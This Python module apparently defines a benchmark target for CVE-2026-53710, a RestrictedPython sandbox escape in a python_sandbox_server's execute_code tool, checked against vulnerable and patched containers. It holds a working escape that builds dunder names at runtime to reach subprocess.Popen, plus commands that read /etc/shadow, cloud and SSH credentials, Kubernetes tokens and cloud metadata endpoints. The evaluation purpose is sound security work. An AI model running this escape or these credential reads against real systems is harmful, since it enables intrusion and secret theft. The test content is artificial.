"""CVE-2026-53710: RestrictedPython sandbox bypass in python_sandbox_server (command execution).

The target is the `execute_code` tool of IBM mcp-context-forge's python_sandbox_server. On the
vulnerable version a raw `getattr` in safe_builtins, combined with runtime-built dunder names that
slip past the substring validator, walks the class hierarchy to `subprocess.Popen` and runs OS
commands of the caller's choice: reach = command_execution. The patched version drops
`getattr`/`setattr` from safe_builtins and mediates every attribute access, so the escape fails.

Deployment layout: the server runs from the checkout (/srv/app) under the unprivileged account,
the layout read-only; the three cloud-metadata endpoints are sentinels bound in a holder the
server shares.

Each exploit escapes once and runs one command that reads one kept place; the benign call is plain
arithmetic.
"""

import re
import shlex

from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Place, Places, PlantKind
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_planting_base import LayoutMount
from evals.cve_planting_spec import resolve_container_path
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

SERVICE = "holdout-2026-53710-python-sandbox"
PATCHED = "holdout-2026-53710-python-sandbox-patched"
TOOL = "execute_code"
WORKING_DIRECTORY = "/srv/app"

AIM = re.compile(r"getattr")

# Fetch helper run as a fresh `python -c` child for the network endpoint places.
_FETCH = (
    "import sys, urllib.request as u\n"
    "sys.stdout.write(u.urlopen(sys.argv[1], timeout=8).read().decode('utf-8','replace'))\n"
)

KEPT_PLACES: tuple[str, ...] = (
    "process-account-identity",
    "container-hostname",
    "etc-shadow",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "run-secrets",
    "k8s-sa-token",
    "etc-hosts",
    "auth-log",
    "proc-environ",
    "imds",
    "ecs-task-credentials",
    "eks-pod-identity",
)


def _escape(argv: list[str]) -> str:
    return (
        "ga = getattr\n"
        "subs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\n"
        "subs = ga(subs,'__subcl'+'asses__')()\n"
        "P = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\n"
        f"p = P({argv!r}, stdout=-1, stderr=-1)\n"
        "out = ga(p,'communicate')()[0]\n"
        "out\n"
    )


def _argv_for(place: Place) -> list[str]:
    kind = place.kind
    if kind is PlantKind.ACCOUNT:
        return ["id"]
    if kind is PlantKind.HOSTNAME:
        return ["cat", "/etc/hostname"]
    if kind is PlantKind.ENV:
        name = place.coordinates.name
        assert name is not None
        return ["printenv", name]
    if kind is PlantKind.HTTP_ENDPOINT:
        url = f"http://{place.coordinates.host}{place.coordinates.path}"
        return ["python", "-c", _FETCH, url]
    if kind is PlantKind.FILE:
        coordinates = place.coordinates
        if coordinates.paths is not None:
            raws = coordinates.paths
        elif coordinates.path is not None:
            raws = (coordinates.path,)
        else:
            raise ValueError(f"{place.id}: a file place with no path coordinate")
        paths = [resolve_container_path(raw, WORKING_DIRECTORY) for raw in raws]
        cat = "cat " + " ".join(shlex.quote(path) for path in paths) + " 2>/dev/null"
        return ["/bin/sh", "-c", cat]
    raise ValueError(f"{place.id}: no exploit for kind {kind}")


def _make_exploit(place_id: str):
    async def exploit(places: Places, client: MCPClientPort) -> None:
        await client.call_tool(TOOL, {"code": _escape(_argv_for(places[place_id]))})

    return exploit


async def _benign(places: Places, client: MCPClientPort) -> None:
    await client.call_tool(TOOL, {"code": "6 * 7"})


TARGET = CVETarget(
    cve_id="CVE-2026-53710",
    severity="CVSS 9.8 (v3.1, placeholder)",
    mechanisms=frozenset({MechanismClass.COMMAND_EXECUTION}),
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=(SERVICE, "sentinel"),
    server_image=SERVICE,
    patched_image=PATCHED,
    planting_host=PlantingHost(
        user=SymbolicUser.UNPRIVILEGED,
        working_directory=WORKING_DIRECTORY,
        has_network=True,
        layout_mount=LayoutMount.READ_ONLY,
    ),
    builder=command_injection_env,
    exploits=tuple(_make_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "RestrictedPython sandbox bypass: execute_code exposes a raw getattr whose runtime-built "
        "dunder names slip past the substring validator, walking the class hierarchy to "
        "subprocess.Popen so an arbitrary OS command runs in the server's container and its output "
        "is returned."
    ),
    tools_filter=None,
)
